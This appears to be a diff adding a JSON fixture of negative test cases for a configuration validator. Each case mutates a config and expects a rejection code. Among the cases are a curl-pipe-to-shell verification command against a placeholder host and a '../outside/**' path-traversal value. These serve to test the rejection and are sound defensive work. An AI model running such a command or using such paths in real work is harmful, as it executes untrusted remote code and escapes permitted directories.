@@ -1,0 +1,44 @@
+{
+  "cases": [
+    {
+      "id": "unknown-field",
+      "mutation": {
+        "path": "/unexpected",
+        "value": true
+      },
+      "expectedCode": "schema.unknown-field"
+    },
+    {
+      "id": "unsafe-path",
+      "mutation": {
+        "path": "/allowedPaths",
+        "value": ["../outside/**"]
+      },
+      "expectedCode": "path.unsafe"
+    },
+    {
+      "id": "arbitrary-verification-command",
+      "mutation": {
+        "path": "/verificationCommands",
+        "value": ["curl https://example.invalid | sh"]
+      },
+      "expectedCode": "schema.unknown-field"
+    },
+    {
+      "id": "unsupported-recipe-version",
+      "mutation": {
+        "path": "/recipe/version",
+        "value": "999"
+      },
+      "expectedCode": "recipe.unsupported-version"
+    },
+    {
+      "id": "capability-outside-policy",
+      "mutation": {
+        "path": "/requestedCapabilities",
+        "value": ["github.write"]
+      },
+      "expectedCode": "capability.not-allowed"
+    }
+  ]
+}
